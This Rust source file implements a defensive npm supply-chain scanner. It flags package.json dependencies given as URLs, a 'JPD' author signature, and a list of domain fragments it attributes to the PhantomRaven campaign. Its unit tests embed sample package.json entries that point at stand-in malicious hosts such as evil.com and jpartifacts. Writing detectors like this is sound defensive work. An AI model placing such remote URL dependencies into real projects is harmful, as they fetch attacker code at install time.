//! Remote Dynamic Dependencies (RDD) Detector
//!
//! Detects npm packages that use URL-based dependencies instead of registry packages.
//! This technique is used by PhantomRaven campaign to inject malicious code during install.
//!
//! ## Detection Logic
//!
//! This detector scans package.json files for:
//! 1. URL dependencies (http:// or https:// URLs in dependencies/devDependencies)
//! 2. "JPD" author field (PhantomRaven signature)
//! 3. Known C2 domains (storeartifact, jpartifacts, etc.)
//!
//! ## Severity
//!
//! Critical - indicates potential PhantomRaven attack

use crate::config::UnicodeConfig;
use crate::detector::{Detector, DetectorMetadata, ScanContext};
use crate::finding::{DetectionCategory, Finding, Severity};
use serde_json::Value;
use std::path::Path;

/// Known PhantomRaven C2 domain patterns
const C2_DOMAIN_PATTERNS: &[&str] = &[
    "storeartifact",
    "jpartifacts",
    "artifactsnpm",
    "storeartifacts",
];

/// Detector for RDD attacks
pub struct RddDetector;

impl RddDetector {
    /// Create a new RDD detector
    pub fn new() -> Self {
        Self
    }
}

impl Default for RddDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for RddDetector {
    fn name(&self) -> &str {
        "rdd_attack"
    }

    fn detect(&self, ctx: &ScanContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        let path = Path::new(&ctx.file_path);

        // Only scan package.json files
        let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
        if file_name != "package.json" {
            return findings;
        }

        // Parse package.json
        let parsed: Value = match serde_json::from_str(&ctx.content) {
            Ok(v) => v,
            Err(_) => return findings, // Invalid JSON, skip
        };

        // Check for "JPD" author (PhantomRaven signature)
        if let Some(author) = parsed.get("author").and_then(|a| a.get("name")).and_then(|n| n.as_str()) {
            if author == "JPD" {
                findings.push(
                    Finding::new(
                        &path.to_string_lossy(),
                        1,
                        1,
                        0,
                        '\0',
                        DetectionCategory::RddAttack,
                        Severity::Critical,
                        "PhantomRaven signature detected: 'JPD' author field",
                        "This package uses the 'JPD' author signature associated with the PhantomRaven campaign. Immediate investigation required.",
                    )
                    .with_cwe_id("CWE-506")
                    .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode"),
                );
            }
        }

        // Check dependencies for URL-based dependencies
        if let Some(deps) = parsed.get("dependencies").and_then(|d| d.as_object()) {
            for (name, value) in deps {
                if let Some(url) = value.as_str() {
                    if url.starts_with("http://") || url.starts_with("https://") {
                        let severity = if C2_DOMAIN_PATTERNS.iter().any(|p| url.contains(p)) {
                            Severity::Critical
                        } else {
                            Severity::High
                        };

                        findings.push(
                            Finding::new(
                                &path.to_string_lossy(),
                                1,
                                1,
                                0,
                                '\0',
                                DetectionCategory::RddAttack,
                                severity,
                                &format!("URL dependency detected: {} -> {}", name, url),
                                "Remote Dynamic Dependencies (RDD) allow attackers to inject malicious code during npm install. This technique is used by the PhantomRaven campaign.",
                            )
                            .with_cwe_id("CWE-506")
                            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode"),
                        );
                    }
                }
            }
        }

        // Check devDependencies for URL-based dependencies
        if let Some(deps) = parsed.get("devDependencies").and_then(|d| d.as_object()) {
            for (name, value) in deps {
                if let Some(url) = value.as_str() {
                    if url.starts_with("http://") || url.starts_with("https://") {
                        let severity = if C2_DOMAIN_PATTERNS.iter().any(|p| url.contains(p)) {
                            Severity::Critical
                        } else {
                            Severity::High
                        };

                        findings.push(
                            Finding::new(
                                &path.to_string_lossy(),
                                1,
                                1,
                                0,
                                '\0',
                                DetectionCategory::RddAttack,
                                severity,
                                &format!("URL devDependency detected: {} -> {}", name, url),
                                "Remote Dynamic Dependencies (RDD) allow attackers to inject malicious code during npm install. This technique is used by the PhantomRaven campaign.",
                            )
                            .with_cwe_id("CWE-506")
                            .with_reference("https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode"),
                        );
                    }
                }
            }
        }

        findings
    }

    fn metadata(&self) -> DetectorMetadata {
        DetectorMetadata {
            name: "rdd_attack".to_string(),
            version: "1.0.0".to_string(),
            description: "Detects Remote Dynamic Dependencies (RDD) and PhantomRaven campaign signatures".to_string().to_string(),
        }
    }
}

impl RddDetector {
    /// Backward compatibility method for tests
    pub fn scan(&self, path: &Path, content: &str, _config: &UnicodeConfig) -> Vec<Finding> {
        let ctx = ScanContext::new(path.to_string_lossy().to_string(), content.to_string(), UnicodeConfig::default());
        self.detect(&ctx)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_rdd_url_dependency() {
        let detector = RddDetector::new();
        let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "ui-styles-pkg": "http://packages.storeartifact.com/npm/unused-imports"
            }
        }"#;

        let findings = detector.scan(Path::new("package.json"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::RddAttack);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_detect_jpd_author() {
        let detector = RddDetector::new();
        let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "author": {
                "name": "JPD"
            }
        }"#;

        let findings = detector.scan(Path::new("package.json"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::RddAttack);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_detect_devdependencies_rdd() {
        let detector = RddDetector::new();
        let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "devDependencies": {
                "malicious-pkg": "https://npm.jpartifacts.com/jpd.php"
            }
        }"#;

        let findings = detector.scan(Path::new("package.json"), content, &UnicodeConfig::default());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].category, DetectionCategory::RddAttack);
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_no_detect_legitimate_package() {
        let detector = RddDetector::new();
        let content = r#"{
            "name": "legitimate-package",
            "version": "1.0.0",
            "dependencies": {
                "lodash": "^4.17.21",
                "express": "^4.18.0"
            },
            "author": {
                "name": "John Doe"
            }
        }"#;

        let findings = detector.scan(Path::new("package.json"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_no_detect_non_package_json() {
        let detector = RddDetector::new();
        let content = r#"{
            "dependencies": {
                "malicious": "http://evil.com/pkg"
            }
        }"#;

        // Should not detect RDD in non-package.json files
        let findings = detector.scan(Path::new("config.json"), content, &UnicodeConfig::default());
        assert!(findings.is_empty());
    }
}
